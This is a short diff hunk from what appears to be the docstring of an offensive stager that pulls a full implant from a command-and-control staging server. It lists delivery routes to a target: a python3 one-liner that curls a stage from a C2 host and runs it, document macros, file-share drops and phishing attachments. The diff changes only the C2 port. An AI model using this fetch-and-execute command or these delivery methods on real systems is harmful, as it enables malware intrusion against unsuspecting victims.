@@ -7,7 +7,7 @@ This is what gets delivered to the target — small footprint,
 pulls the full implant from the C2 staging server.
 
 Delivery methods:
-    - python3 -c "$(curl -s http://C2:8443/stage)"
+    - python3 -c "$(curl -s http://C2:6708/stage)"
     - Embedded in a document macro
     - Dropped via file share
     - Phishing attachment
